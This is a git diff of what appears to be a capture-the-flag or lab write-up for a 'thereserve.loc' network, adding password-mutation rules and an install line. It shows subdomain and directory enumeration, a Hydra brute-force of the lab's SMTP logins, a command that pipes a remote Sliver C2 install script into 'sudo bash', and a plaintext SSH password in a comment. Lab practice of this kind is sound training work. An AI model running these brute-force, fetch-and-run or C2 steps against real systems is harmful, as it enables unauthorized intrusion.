@@ -117,7 +117,10 @@ gobuster vhost -u http://thereserve.loc -w /usr/share/seclists/Discovery/DNS/sub
 #
 gobuster dir -u http://mail.thereserve.loc -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt  mail-dirs-raftsmallwords.gb
 # $WORD from password_base_list
+
+
 mp32 --custom-charset1='!@#$%^' $WORD?d?1 >> mp32-passwd.lst
+mp32 --custom-charset1='!@#$%^' $WORD?1?d >> mp32-passwd.lst
 # Hydra the SMTP server
 hydra -L lists/emails.txt -P mp32-passwd.lst mail.thereserve.loc smtp
 ```
@@ -217,7 +220,7 @@ nohup ./VPN-update &
 ```bash
 curl https://sliver.sh/install|sudo bash
 
-sudo apt install thunderbird remmina certipy-ad neo4j bloodhound-y
+sudo apt install thunderbird remmina certipy-ad neo4j ntpdate bloodhound -y
 # Authenicate
 # ssh e-citizen@10.200.121.250 - stabilitythroughcurrency
 thunderbird
